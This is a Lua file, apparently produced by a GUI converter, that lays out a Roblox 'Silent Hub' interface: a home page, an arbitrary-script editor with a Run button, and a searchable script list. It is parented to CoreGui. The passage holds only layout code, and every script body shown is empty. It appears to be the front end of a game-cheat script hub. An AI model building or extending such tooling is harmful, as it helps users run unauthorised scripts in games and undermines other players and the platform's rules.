--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 136 | Scripts: 23 | Modules: 0 | Tags: 7
local CollectionService = game:GetService("CollectionService");
local G2L = {};

-- StarterGui.SilentHub
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 999999999;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["ClipToDeviceSafeArea"] = false;
G2L["1"]["Name"] = [[SilentHub]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.SilentHub.UI
G2L["2"] = Instance.new("Folder", G2L["1"]);
G2L["2"]["Name"] = [[UI]];


-- StarterGui.SilentHub.UI.MainContainer
G2L["3"] = Instance.new("Frame", G2L["2"]);
G2L["3"]["Active"] = true;
G2L["3"]["BorderSizePixel"] = 0;
G2L["3"]["BackgroundColor3"] = Color3.fromRGB(51, 51, 51);
G2L["3"]["ClipsDescendants"] = true;
G2L["3"]["Size"] = UDim2.new(0, 603, 0, 311);
G2L["3"]["Position"] = UDim2.new(0.23019, 0, 0.25308, 0);
G2L["3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3"]["Name"] = [[MainContainer]];


-- StarterGui.SilentHub.UI.MainContainer.UIDrag
G2L["4"] = Instance.new("LocalScript", G2L["3"]);
-- G2L["4"]["Capabilities"] = ;
G2L["4"]["Sandboxed"] = true;
G2L["4"]["Name"] = [[UIDrag]];


-- StarterGui.SilentHub.UI.MainContainer.Header
G2L["5"] = Instance.new("Frame", G2L["3"]);
G2L["5"]["ZIndex"] = 3;
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Size"] = UDim2.new(0, 603, 0, 37);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Name"] = [[Header]];
G2L["5"]["LayoutOrder"] = 3;
G2L["5"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.Header.Burger
G2L["6"] = Instance.new("ImageButton", G2L["5"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["AutoButtonColor"] = false;
G2L["6"]["BackgroundTransparency"] = 1;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Image"] = [[rbxassetid://8733216068]];
G2L["6"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Name"] = [[Burger]];
G2L["6"]["Position"] = UDim2.new(0.01, 0, 0.1, 0);


-- StarterGui.SilentHub.UI.MainContainer.Header.Burger.LocalScript
G2L["7"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.SilentHub.UI.MainContainer.Header.Minimize
G2L["8"] = Instance.new("TextButton", G2L["5"]);
G2L["8"]["BorderSizePixel"] = 0;
G2L["8"]["TextSize"] = 30;
G2L["8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["FontFace"] = Font.new([[rbxassetid://16658237174]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8"]["BackgroundTransparency"] = 0.95;
G2L["8"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Text"] = [[_]];
G2L["8"]["Name"] = [[Minimize]];
G2L["8"]["Position"] = UDim2.new(0.87, 0, 0.1, 0);


-- StarterGui.SilentHub.UI.MainContainer.Header.Minimize.LocalScript
G2L["9"] = Instance.new("LocalScript", G2L["8"]);



-- StarterGui.SilentHub.UI.MainContainer.Header.Minimize.UICorner
G2L["a"] = Instance.new("UICorner", G2L["8"]);
G2L["a"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.SilentHub.UI.MainContainer.Header.TextLabel
G2L["b"] = Instance.new("TextLabel", G2L["5"]);
G2L["b"]["BorderSizePixel"] = 0;
G2L["b"]["TextSize"] = 20;
G2L["b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["FontFace"] = Font.new([[rbxassetid://16658237174]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["b"]["BackgroundTransparency"] = 1;
G2L["b"]["Size"] = UDim2.new(0, 109, 0, 30);
G2L["b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b"]["Text"] = [[Silent Hub]];
G2L["b"]["Position"] = UDim2.new(0.40936, 0, 0.1, 0);


-- StarterGui.SilentHub.UI.MainContainer.Header.UICorner
G2L["c"] = Instance.new("UICorner", G2L["5"]);
G2L["c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.Header.Close
G2L["d"] = Instance.new("TextButton", G2L["5"]);
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["TextSize"] = 30;
G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Merriweather.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["d"]["BackgroundTransparency"] = 0.95;
G2L["d"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["Text"] = [[🗙]];
G2L["d"]["Name"] = [[Close]];
G2L["d"]["Position"] = UDim2.new(0.94, 0, 0.1, 0);


-- StarterGui.SilentHub.UI.MainContainer.Header.Close.LocalScript
G2L["e"] = Instance.new("LocalScript", G2L["d"]);



-- StarterGui.SilentHub.UI.MainContainer.Header.Close.UICorner
G2L["f"] = Instance.new("UICorner", G2L["d"]);
G2L["f"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer
G2L["10"] = Instance.new("Frame", G2L["3"]);
G2L["10"]["ZIndex"] = 2;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["ClipsDescendants"] = true;
G2L["10"]["Size"] = UDim2.new(0, 100, 0, 273);
G2L["10"]["Position"] = UDim2.new(0, 0, 0.12016, 0);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Name"] = [[MenuContainer]];
G2L["10"]["LayoutOrder"] = 2;
G2L["10"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.LocalScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.UICorner
G2L["12"] = Instance.new("UICorner", G2L["10"]);
G2L["12"]["CornerRadius"] = UDim.new(0, 0);


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.UIListLayout
G2L["13"] = Instance.new("UIListLayout", G2L["10"]);
G2L["13"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["13"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["13"]["Padding"] = UDim.new(0.03, 0);
G2L["13"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["13"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.MenuButton
G2L["14"] = Instance.new("TextButton", G2L["10"]);
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextSize"] = 14;
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["BackgroundTransparency"] = 1;
G2L["14"]["Size"] = UDim2.new(0, 86, 0, 26);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Name"] = [[MenuButton]];
G2L["14"]["Position"] = UDim2.new(-0.5, 0, 0.40842, 0);


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.MenuButton.UICorner
G2L["15"] = Instance.new("UICorner", G2L["14"]);
G2L["15"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.MenuContainer.MenuButton.IndicatorLine
G2L["16"] = Instance.new("Frame", G2L["14"]);
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["AnchorPoint"] = Vector2.new(0.012, 0);
G2L["16"]["Size"] = UDim2.new(0, 86, 0.05, 0);
G2L["16"]["Position"] = UDim2.new(0.01163, 0, 1, 0);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Name"] = [[IndicatorLine]];


-- StarterGui.SilentHub.UI.MainContainer.PageContainer
G2L["17"] = Instance.new("Frame", G2L["3"]);
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["ClipsDescendants"] = true;
G2L["17"]["Size"] = UDim2.new(0, 603, 0, 273);
G2L["17"]["Position"] = UDim2.new(0, 0, 0.12016, 0);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Name"] = [[PageContainer]];
G2L["17"]["BackgroundTransparency"] = 0.5;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.UICorner
G2L["18"] = Instance.new("UICorner", G2L["17"]);
G2L["18"]["CornerRadius"] = UDim.new(0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home
G2L["19"] = Instance.new("ScrollingFrame", G2L["17"]);
G2L["19"]["Active"] = true;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["19"]["ScrollingEnabled"] = false;
G2L["19"]["Name"] = [[Home]];
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["19"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["ScrollBarThickness"] = 5;
G2L["19"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["19"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.UICorner
G2L["1a"] = Instance.new("UICorner", G2L["19"]);
G2L["1a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.Welcome
G2L["1b"] = Instance.new("TextLabel", G2L["19"]);
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextSize"] = 14;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["BackgroundTransparency"] = 1;
G2L["1b"]["RichText"] = true;
G2L["1b"]["Size"] = UDim2.new(0, 486, 0, 142);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[<font size="30" weight="heavy">Welcome to Silent Hub!</font><br/><br/>To get started click the tabs to find what scripts your looking for.<br/>The scrolling bar is invisible so to scroll use your scroll wheel.<br/><br/>Want scripts or more features added?<br/><br/>Join our Discord for support, donations, and more!]];
G2L["1b"]["Name"] = [[Welcome]];


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer
G2L["1c"] = Instance.new("Frame", G2L["19"]);
G2L["1c"]["BorderSizePixel"] = 0;
G2L["1c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1c"]["Size"] = UDim2.new(0, 486, 0, 115);
G2L["1c"]["Position"] = UDim2.new(0, 0, 0.55253, 0);
G2L["1c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1c"]["Name"] = [[ButtonContainer]];
G2L["1c"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.UIListLayout
G2L["1d"] = Instance.new("UIListLayout", G2L["1c"]);
G2L["1d"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["1d"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceAround;
G2L["1d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.Discord
G2L["1e"] = Instance.new("TextButton", G2L["1c"]);
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["TextSize"] = 14;
G2L["1e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1e"]["BackgroundTransparency"] = 0.95;
G2L["1e"]["Size"] = UDim2.new(0, 452, 0, 45);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["Text"] = [[Server:]];
G2L["1e"]["Name"] = [[Discord]];
G2L["1e"]["Position"] = UDim2.new(0.03498, 0, 0.66981, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.Discord.LocalScript
G2L["1f"] = Instance.new("LocalScript", G2L["1e"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.Discord.UICorner
G2L["20"] = Instance.new("UICorner", G2L["1e"]);
G2L["20"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.MOTD
G2L["21"] = Instance.new("TextLabel", G2L["1c"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["TextSize"] = 14;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["BackgroundTransparency"] = 0.95;
G2L["21"]["Size"] = UDim2.new(0, 452, 0, 45);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Text"] = [[MOTD:]];
G2L["21"]["Name"] = [[MOTD]];
G2L["21"]["Position"] = UDim2.new(0.03498, 0, 0.08043, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.MOTD.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Home.ButtonContainer.MOTD.UICorner
G2L["23"] = Instance.new("UICorner", G2L["21"]);
G2L["23"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor
G2L["24"] = Instance.new("ScrollingFrame", G2L["17"]);
G2L["24"]["Visible"] = false;
G2L["24"]["Active"] = true;
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["24"]["ScrollingEnabled"] = false;
G2L["24"]["Name"] = [[Script Editor]];
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["24"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["ScrollBarThickness"] = 5;
G2L["24"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["24"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.UICorner
G2L["25"] = Instance.new("UICorner", G2L["24"]);
G2L["25"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.EditorContainer
G2L["26"] = Instance.new("Frame", G2L["24"]);
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["Size"] = UDim2.new(0, 469, 0, 214);
G2L["26"]["Position"] = UDim2.new(0.01646, 0, 0.01946, 0);
G2L["26"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["26"]["Name"] = [[EditorContainer]];
G2L["26"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.EditorContainer.TextBoxContainer
G2L["27"] = Instance.new("ScrollingFrame", G2L["26"]);
G2L["27"]["Active"] = true;
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["27"]["Name"] = [[TextBoxContainer]];
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["AutomaticCanvasSize"] = Enum.AutomaticSize.XY;
G2L["27"]["Size"] = UDim2.new(0, 469, 0, 213);
G2L["27"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["ScrollBarThickness"] = 3;
G2L["27"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.EditorContainer.TextBoxContainer.TextBox
G2L["28"] = Instance.new("TextBox", G2L["27"]);
G2L["28"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["TextSize"] = 12;
G2L["28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["28"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["28"]["AutomaticSize"] = Enum.AutomaticSize.XY;
G2L["28"]["MultiLine"] = true;
G2L["28"]["ClearTextOnFocus"] = false;
G2L["28"]["Size"] = UDim2.new(0, 469, 0, 15);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["Text"] = [[print("Hello World!")]];
G2L["28"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.EditorContainer.TextBoxContainer.UICorner
G2L["29"] = Instance.new("UICorner", G2L["27"]);
G2L["29"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.EditorContainer.UICorner
G2L["2a"] = Instance.new("UICorner", G2L["26"]);
G2L["2a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer
G2L["2b"] = Instance.new("Frame", G2L["24"]);
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["Size"] = UDim2.new(0, 469, 0, 23);
G2L["2b"]["Position"] = UDim2.new(0.01646, 0, 0.87938, 0);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Name"] = [[ButtonContainer]];
G2L["2b"]["BackgroundTransparency"] = 1;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Run
G2L["2c"] = Instance.new("TextButton", G2L["2b"]);
G2L["2c"]["BorderSizePixel"] = 0;
G2L["2c"]["TextSize"] = 14;
G2L["2c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2c"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2c"]["BackgroundTransparency"] = 0.95;
G2L["2c"]["Size"] = UDim2.new(0, 230, 0, 23);
G2L["2c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2c"]["Text"] = [[Run]];
G2L["2c"]["Name"] = [[Run]];
G2L["2c"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Run.LocalScript
G2L["2d"] = Instance.new("LocalScript", G2L["2c"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Run.UICorner
G2L["2e"] = Instance.new("UICorner", G2L["2c"]);
G2L["2e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.UIListLayout
G2L["2f"] = Instance.new("UIListLayout", G2L["2b"]);
G2L["2f"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["2f"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["2f"]["Padding"] = UDim.new(0.01, 0);
G2L["2f"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["2f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["2f"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Clear
G2L["30"] = Instance.new("TextButton", G2L["2b"]);
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["TextSize"] = 14;
G2L["30"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["30"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["30"]["BackgroundTransparency"] = 0.95;
G2L["30"]["Size"] = UDim2.new(0, 230, 0, 23);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["Text"] = [[Clear]];
G2L["30"]["Name"] = [[Clear]];
G2L["30"]["Position"] = UDim2.new(0.49104, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Clear.LocalScript
G2L["31"] = Instance.new("LocalScript", G2L["30"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Clear.UICorner
G2L["32"] = Instance.new("UICorner", G2L["30"]);
G2L["32"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R6
G2L["33"] = Instance.new("TextButton", G2L["2b"]);
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["TextSize"] = 14;
G2L["33"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["33"]["BackgroundTransparency"] = 0.95;
G2L["33"]["Size"] = UDim2.new(0, 96, 0, 23);
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Text"] = [[R6]];
G2L["33"]["Name"] = [[R6]];
G2L["33"]["Position"] = UDim2.new(0.52995, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R6.LocalScript
G2L["34"] = Instance.new("LocalScript", G2L["33"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R6.UICorner
G2L["35"] = Instance.new("UICorner", G2L["33"]);
G2L["35"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R15
G2L["36"] = Instance.new("TextButton", G2L["2b"]);
G2L["36"]["BorderSizePixel"] = 0;
G2L["36"]["TextSize"] = 14;
G2L["36"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["36"]["BackgroundTransparency"] = 0.95;
G2L["36"]["Size"] = UDim2.new(0, 96, 0, 23);
G2L["36"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36"]["Text"] = [[R15]];
G2L["36"]["Name"] = [[R15]];
G2L["36"]["Position"] = UDim2.new(0.73568, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R15.LocalScript
G2L["37"] = Instance.new("LocalScript", G2L["36"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.R15.UICorner
G2L["38"] = Instance.new("UICorner", G2L["36"]);
G2L["38"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Respawn
G2L["39"] = Instance.new("TextButton", G2L["2b"]);
G2L["39"]["BorderSizePixel"] = 0;
G2L["39"]["TextSize"] = 14;
G2L["39"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39"]["BackgroundTransparency"] = 0.95;
G2L["39"]["Size"] = UDim2.new(0, 96, 0, 23);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Text"] = [[Respawn]];
G2L["39"]["Name"] = [[Respawn]];
G2L["39"]["Position"] = UDim2.new(0.9414, 0, 0, 0);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Respawn.LocalScript
G2L["3a"] = Instance.new("LocalScript", G2L["39"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Script Editor.ButtonContainer.Respawn.UICorner
G2L["3b"] = Instance.new("UICorner", G2L["39"]);
G2L["3b"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts
G2L["3c"] = Instance.new("ScrollingFrame", G2L["17"]);
G2L["3c"]["Visible"] = false;
G2L["3c"]["Active"] = true;
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["3c"]["ScrollingEnabled"] = false;
G2L["3c"]["Name"] = [[Scripts]];
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["Size"] = UDim2.new(0, 486, 0, 257);
G2L["3c"]["Position"] = UDim2.new(0.1791, 0, 0.0293, 0);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["ScrollBarThickness"] = 5;
G2L["3c"]["BackgroundTransparency"] = 0.95;

-- Tags
CollectionService:AddTag(G2L["3c"], [[page]]);

-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.UICorner
G2L["3d"] = Instance.new("UICorner", G2L["3c"]);
G2L["3d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.SearchBox
G2L["3e"] = Instance.new("TextBox", G2L["3c"]);
G2L["3e"]["Name"] = [[SearchBox]];
G2L["3e"]["PlaceholderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["BorderSizePixel"] = 0;
G2L["3e"]["TextWrapped"] = true;
G2L["3e"]["TextSize"] = 14;
G2L["3e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3e"]["PlaceholderText"] = [[Search Scripts]];
G2L["3e"]["Size"] = UDim2.new(0, 470, 0, 24);
G2L["3e"]["Position"] = UDim2.new(0.01646, 0, 0.02015, 0);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Text"] = [[]];
G2L["3e"]["BackgroundTransparency"] = 0.95;


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.SearchBox.LocalScript
G2L["3f"] = Instance.new("LocalScript", G2L["3e"]);



-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.SearchBox.UICorner
G2L["40"] = Instance.new("UICorner", G2L["3e"]);
G2L["40"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.SilentHub.UI.MainContainer.PageContainer.Scripts.ButtonContainer
G2L["41"] = Instance.new("ScrollingFrame", G2L["3c"]);
G2L["41"]["Active"] = true;
G2L["41"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
